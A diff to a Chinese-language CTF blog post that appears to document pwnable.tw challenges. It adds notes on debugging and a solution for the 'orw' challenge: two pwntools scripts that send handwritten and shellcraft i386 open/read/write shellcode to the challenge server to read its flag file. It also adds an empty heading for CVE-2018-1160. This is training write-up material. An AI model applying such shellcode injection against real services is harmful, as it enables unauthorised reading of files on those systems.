@@ -4,7 +4,7 @@ image: ''
 pinned: false
 comment: true
 published: 2026-06-01
-updated: 2026-06-01
+updated: 2026-06-02
 description: "pwn"
 category: PWN
 tags: [PWN]
@@ -135,6 +135,105 @@ io.interactive()
 因为纯汇编的缘故，我看不懂。
 
 但是有个方法，就是纯动态调试。
+
+![image-20260602200356141](/images/image-20260602200356141.png)
+
+![image-20260602200405720](/images/image-20260602200405720.png)
+
+有点不太会 我想要展示的效果就是在我原脚本加断点 然后动态调试的信息会根据我脚本运行的每一步产生相应的变化，但是失败了。
+
+不过，ai还是出了力。
+
+![image-20260602200559102](/images/image-20260602200559102.png)
+
+![image-20260602200611845](/images/image-20260602200611845.png)
+
+我已经尽可能的想要表述清楚这次的攻击流程，奈何技术不够，只能这样了。
+
+最后把本地改成远程就可以打通了。
+
+
+
+![image-20260602211816537](/images/image-20260602211816537.png)
+
+# 2.orw(基础ret2shellcode)
+
+纯自写orw的open，read，write汇编，变成shellcode。
+
+![image-20260602211911373](/images/image-20260602211911373.png)
+
+### exp：
+
+```
+from pwn import *
+
+context.arch = 'i386'
+context.os = 'linux'
+context.log_level = 'debug'
+
+io = remote('chall.pwnable.tw', 10001)
+
+shellcode = asm('''
+    xor ecx, ecx
+    xor edx, edx
+    push edx
+    push 0x67616c66
+    push 0x2f77726f
+    push 0x2f656d6f
+    push 0x682f2f2f
+    mov ebx, esp
+    mov eax, 5
+    int 0x80
+
+    mov ebx, eax
+    mov ecx, esp
+    mov edx, 0x40
+    mov eax, 3
+    int 0x80
+
+    mov edx, eax
+    mov ebx, 1
+    mov eax, 4
+    int 0x80
+''')
+
+io.recvuntil(b'shellcode:')
+io.send(shellcode)
+io.interactive()
+```
+
+相当于：
+
+```
+from pwn import *
+
+context.arch = 'i386'
+context.os = 'linux'
+
+io = remote('chall.pwnable.tw', 10001)
+
+shellcode = asm(
+    shellcraft.open('/home/orw/flag') +
+    shellcraft.read('eax', 'esp', 0x40) +
+    shellcraft.write(1, 'esp', 0x40)
+)
+
+io.recvuntil(b'shellcode:')
+io.send(shellcode)
+io.interactive()
+```
+
+![image-20260602212039770](/images/image-20260602212039770.png)
+
+
+
+# 3.CVE-2018-1160
+
+
+
+
+
+
 
 
 
